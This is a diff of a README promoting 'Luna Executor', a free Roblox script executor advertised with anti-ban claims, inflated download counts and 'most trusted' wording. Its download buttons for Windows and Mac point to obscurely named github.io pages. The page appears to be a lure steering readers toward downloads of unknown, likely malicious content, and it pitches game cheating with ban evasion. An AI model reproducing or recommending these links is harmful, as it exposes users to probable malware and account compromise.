@@ -2,12 +2,6 @@
   <img src="https://capsule-render.vercel.app/api?type=waving&color=0:6C5CE7,30:A29BFE,70:FD79A8,100:E84393&height=300&section=header&text=Luna%20Executor&fontColor=FFFFFF&fontSize=50&fontAlignY=40&desc=Execute%20Scripts%20%7C%20Unlimited%20Power%20%7C%20Zero%20Limits&descColor=F8F9FA&descSize=22&descAlignY=65&animation=fadeIn" alt="Luna Executor Banner" />
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Script%20Execution-Instant%20Run-6C5CE7?style=for-the-badge&logo=code&logoColor=white&labelColor=1A1A2E" alt="Script Execution" />
-  <img src="https://img.shields.io/badge/Lua%20Support-Full%20API-A29BFE?style=for-the-badge&logo=lua&logoColor=white&labelColor=1A1A2E" alt="Lua Support" />
-  <img src="https://img.shields.io/badge/Anti-Ban-FD79A8?style=for-the-badge&logo=shield&logoColor=white&labelColor=1A1A2E" alt="Anti-Ban" />
-</p>
-
 # 🚀 Luna Executor — Free Keyless Roblox Script Executor [2026]
 
 ![Downloads](https://img.shields.io/badge/Total%20Downloads-2.1M+-blue?style=for-the-badge&logo=github)
@@ -23,10 +17,6 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 [![Download Luna Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
 [![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
-</div>
-
-<div align="center">
-<img alt="Luna Executor Interface" src="assets/preview.png" />
 </div>
 
 ---
